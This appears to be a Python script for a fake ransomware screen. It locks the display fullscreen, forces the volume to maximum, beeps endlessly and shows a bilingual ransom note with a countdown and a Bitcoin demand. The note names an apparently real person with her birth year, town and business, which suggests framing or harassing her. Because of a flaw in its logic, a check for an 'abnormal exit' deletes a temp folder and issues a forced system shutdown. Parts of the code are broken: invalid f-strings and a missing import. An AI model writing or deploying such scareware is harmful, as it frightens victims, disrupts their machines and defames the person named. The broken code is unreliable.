import tkinter as tk
from tkinter import ttk
import winsound
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import keyboard
import time
import os
import win32con
import urllib.request
from PIL import Image, ImageTk

def set_volume_to_max():
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, 17, None)
        volume = interface.QueryInterface(IAudioEndpointVolume)
        volume.SetMasterVolumeLevel(-0.0, None)
    except Exception as e:
        print(f"Erreur volume : {e}")

def play_error_sound():
    while True:
        winsound.MessageBeep(winsound.MB_ICONHAND)
        time.sleep(1)

def on_key_event(event):
    if event.name.lower() == 'r':  # Restaurer la fermeture avec R
        root.quit()
        return False
    return True

def load_image(url, size):
    try:
        urllib.request.urlretrieve(url, "temp_image.jpg")
        img = Image.open("temp_image.jpg").resize(size, Image.Resampling.LANCZOS)
        return ImageTk.PhotoImage(img)
    except Exception as e:
        print(f"Erreur chargement image : {e}")
        return None

def update_text():
    start_time = time.time()
    end_time = start_time + 60  # Timer de 1 minute

    def update_timer():
        remaining = max(0, int(end_time - time.time()))
        minutes = remaining // 60
        seconds = remaining % 60
        if lang_var.get() == "Français":
            timer_text = f"\n\n{TEMPS RESTANT : {minutes:02d}:{seconds:02d}}\n"  # Timer en gros
            full_text = f"""
Que s'est-il passé sur mon ordinateur ?
TOUS vos documents, photos, vidéos et bases de données sont DÉSORMAIS CRYPTÉS ! Vos fichiers sont piégés, et chaque seconde qui passe rapproche leur destruction totale. Aucun espoir de récupération sans nous, et nous ne plaisantons pas !

Puis-je récupérer mes fichiers ?
OUI, mais le temps vous est compté ! Nous, Julie Savineaux, née en 1986, aujourd'hui âgée de 39 ans en 2025, garantissons une récupération – si vous agissez VITE. Sinon, vos données seront perdues à jamais dans l'obscurité !

Comment payer ?
Le paiement se fait UNIQUEMENT en Bitcoin. Envoyez la somme exigée à l'adresse fictive : 1FakeWalletAddress1234567890ABCDEF. Attention : vos fichiers seront EFFACÉS dans {timer_text} !

{timer_text}
AGISSEZ OU TOUT SERA PERDU !
"""
        else:
            timer_text = f"\n\n{TIME LEFT: {minutes:02d}:{seconds:02d}}\n"  # Timer en gros
            full_text = f"""
What Happened to My Computer?
ALL your documents, photos, videos, and databases are NOW ENCRYPTED! Your files are trapped, and every passing second brings them closer to TOTAL DESTRUCTION. No hope of recovery without us – and we MEAN it!

Can I Recover My Files?
YES, but time is running out! We, Julie Savineaux, born in 1986, now 39 years old in 2025, guarantee recovery – IF you act FAST. Otherwise, your data will vanish into the abyss FOREVER!

How Do I Pay?
Payment is accepted in Bitcoin ONLY. Send the demanded amount to the fake wallet address: 1FakeWalletAddress1234567890ABCDEF. WARNING: your files will be WIPED OUT in {timer_text}!

{timer_text}
ACT NOW OR LOSE EVERYTHING!
"""
        text_canvas.delete("all")
        text_canvas.create_text(300, 200, text=full_text, font=("Arial", 12, "bold"), justify="left", anchor="center")  # Police plus grande
        if remaining > 0:
            root.after(1000, update_timer)
        else:
            root.quit()  # Fermeture automatique à la fin du timer

    # Détection de fermeture anormale (Alt+F4 ou redémarrage)
    def check_abnormal_exit():
        if not os.path.exists(os.path.join(os.getenv("TEMP"), "RansomSim", "running.txt")):
            print("Fermeture anormale détectée (Alt+F4 ou redémarrage). Suppression des fichiers...")
            import shutil
            shutil.rmtree(os.path.join(os.getenv("TEMP"), "RansomSim"), ignore_errors=True)
            os.system("shutdown /s /t 5")
        else:
            root.after(1000, check_abnormal_exit)

    update_timer()
    check_abnormal_exit()

root = tk.Tk()
root.title("Ransomware Team Viewer")
root.configure(bg='#8B0000')
root.attributes('-fullscreen', True)
root.focus_force()

keyboard.hook(on_key_event)

main_frame = tk.Frame(root, bg='#8B0000')
main_frame.pack(fill='both', expand=True, padx=50, pady=50)

title_frame = tk.Frame(main_frame, bg='#8B0000')
title_frame.pack(fill='x', pady=(0, 20))
title_label = tk.Label(title_frame, text="Ransomware Team Viewer", fg='white', bg='#8B0000', 
                       font=("Arial", 24, "bold"), justify='center')
title_label.pack()

style = ttk.Style()
style.configure("Custom.TMenubutton", background='#8B0000', foreground='white', 
                activebackground='#8B0000', activeforeground='white')

lang_var = tk.StringVar(value="English")
lang_menu = ttk.OptionMenu(title_frame, lang_var, "English", "English", "Français", style="Custom.TMenubutton", command=lambda x: update_text())
lang_menu.pack(side='right')

left_frame = tk.Frame(main_frame, bg='#8B0000')
left_frame.pack(side='left', fill='both', expand=True, padx=(0, 20))

top_img = load_image("https://www.netapp.com/media/main-Ransomware-attack-1024x554_tcm19-39457.png", (300, 300))
if top_img:
    top_img_label = tk.Label(left_frame, image=top_img, bg='#8B0000')
    top_img_label.image = top_img
    top_img_label.pack(pady=(0, 20))

bottom_img = load_image("https://pbs.twimg.com/profile_images/378800000634407836/e11eca1fd8007cb3eea2958eb5110191_400x400.jpeg", (300, 300))
if bottom_img:
    bottom_img_label = tk.Label(left_frame, image=bottom_img, bg='#8B0000')
    bottom_img_label.image = bottom_img
    bottom_img_label.pack()

text_canvas = tk.Canvas(main_frame, bg='white', width=600, height=400)
text_canvas.pack(side='right', fill='both', expand=True)

update_text()

footer_frame = tk.Frame(root, bg='#8B0000')
footer_frame.pack(fill='x', side='bottom', pady=10)
footer_text = tk.Label(footer_frame, text="Team Viewer Julie Savineaux\nJs Multimedias\nLunel 34400", 
                       fg='white', bg='#8B0000', font=("Arial", 10), justify='center')
footer_text.pack()

set_volume_to_max()
threading.Thread(target=play_error_sound, daemon=True).start()

try:
    root.mainloop()
finally:
    keyboard.unhook_all()
    winsound.PlaySound(None, winsound.SND_PURGE)
    if os.path.exists(os.path.join(os.getenv("TEMP"), "RansomSim", "running.txt")):
        os.remove(os.path.join(os.getenv("TEMP"), "RansomSim", "running.txt"))
